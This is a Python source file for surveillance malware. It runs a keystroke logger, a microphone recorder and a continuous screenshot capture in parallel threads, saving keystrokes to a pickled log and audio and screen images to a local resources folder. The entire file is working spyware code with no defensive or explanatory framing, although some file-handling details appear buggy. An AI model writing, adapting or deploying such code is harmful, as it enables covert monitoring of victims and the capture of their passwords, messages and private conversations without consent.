import time, sounddevice, os, pickle
from pynput.keyboard import Key, Listener
from scipy.io.wavfile import write
from PIL import ImageGrab
from threading import Thread

main_path = os.path.dirname(os.path.realpath(__file__))

KEYLOGGER_ENABLED = True
INPUT_UPDATE_INTERVAL = 100
TIME_UPDATE_INTERVAL = 60
MIC_SAMPLERATE = 44100
PATH = main_path + r"\\resources\\"

run = True
count = 0
keys = []

current_time = time.time()
stopping_time = time.time() + TIME_UPDATE_INTERVAL

audio_information = "microphone.wav"
screenshot_information = "screen.png"

def microphone():
    fs = MIC_SAMPLERATE
    seconds = TIME_UPDATE_INTERVAL
    myrecording = sounddevice.rec(int(seconds * fs), samplerate=fs, channels=2)
    sounddevice.wait()
    write(PATH + audio_information, fs, myrecording)

def screenshot():
    global TIME_UPDATE_INTERVAL

    run = True
    while run:
        image = ImageGrab.grab()
        image.save(PATH + screenshot_information)
        time.sleep(0.1)

def on_press(key):
    global keys, count, current_time

    current_time = time.time()
    keys.append(key)
    count += 1
    if count > INPUT_UPDATE_INTERVAL:
        write_file(keys)
        count = 0
        keys = []

def write_file(keys):
    with open(f'{PATH}/log.txt', 'rb') as f:
        logs = pickle.load(f)

    for key in keys:
        k = str(key).replace("'","")                   
        if k.find("space") > 0:
            logs = logs + " "
        elif k.find("Key") == -1:
            logs = logs + k
    print(logs)
    with open(f"{PATH}/log.txt", "wb") as f:
        pickle.dump(logs, f)  
    logs = []
    
def on_release(key):
    if key == Key.esc:      
        return False
    if current_time > stopping_time:
        return False

def keylogger():
    run = True
    while run:
        with Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()

def microphone_snooper():
    global stopping_time, TIME_UPDATE_INTERVAL
    run = True
    while run:
        current_time = time.time()
        if current_time > stopping_time:
            current_time = time.time()
            stopping_time = time.time() + TIME_UPDATE_INTERVAL
            microphone()

if __name__ == '__main__':
    Thread(target = keylogger).start()
    Thread(target = microphone_snooper).start()
    Thread(target = screenshot).start()